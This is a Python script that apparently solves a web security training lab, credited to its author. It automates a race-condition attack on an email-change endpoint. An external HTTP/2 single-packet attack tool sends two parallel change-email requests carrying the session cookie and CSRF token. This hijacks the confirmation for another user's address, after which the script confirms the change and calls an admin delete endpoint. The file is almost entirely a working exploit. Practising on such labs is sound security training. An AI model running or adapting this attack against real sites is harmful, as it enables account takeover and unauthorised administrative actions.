import requests
import re
import sys
import shlex
import subprocess


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.email_client_url = None
        self.session = requests.Session()

    def get_csrf_token(self, endpoint):
        response = self.session.get(self.lab_url + endpoint)
        return re.search('name="csrf" value="(.*)"', response.text).group(1)

    def get_email_client_url(self):
        response = self.session.get(self.lab_url)
        self.email_client_url = re.search('(https://exploit-.*?)\'>', response.text).group(1)

    def sign_in_as_wiener(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': 'wiener',
            'password': 'peter'
        }
        self.session.post(self.lab_url + 'login', data=data)

    def get_latest_email(self):
        response = self.session.get(self.email_client_url)
        email_to_change = re.search(r'To confirm your email change to (.*?),', response.text).group(1)
        confirmation_link = re.search(r'({}confirm-email.*?)"'.format(self.lab_url), response.text).group(1)
        return email_to_change, confirmation_link

    def update_email(self):
        hostname = self.lab_url.split('https://')[1].strip('/')
        cookie_header = 'Cookie: session={}'.format(self.session.cookies.get('session'))
        csrf = self.get_csrf_token('my-account')

        email1 = 'hacker@' + self.email_client_url.replace('https://', '').replace('/email', '')
        email2 = 'carlos@ginandjuice.shop'

        found = False
        while not found:
            command = (('python /home/ma4747gh/Desktop/GitHub/H2SinglePacketAttacker/h2_single_packet_attacker.py {} 443 --tls_channel --streams 2 '
                       '--method POST --path /my-account/change-email --data \'email={}&csrf={}\' --header \'{}\' '
                       '--header \'break\' --method POST --path /my-account/change-email --data \'email={}&csrf={}\' '
                       '--header \'{}\' --header \'break\' --multiple_endpoint_mode')
                       .format(hostname, email1, csrf, cookie_header, email2, csrf, cookie_header))

            args = shlex.split(command)
            print(subprocess.run(args).stdout)

            email_to_change, confirmation_link = self.get_latest_email()
            print(email_to_change)

            if 'carlos' in email_to_change:
                self.session.get(confirmation_link.replace('&amp;', '&'))
                self.session.get(self.lab_url + 'admin/delete?username=carlos')
                found = True

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.get_email_client_url()
        self.sign_in_as_wiener()
        self.update_email()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
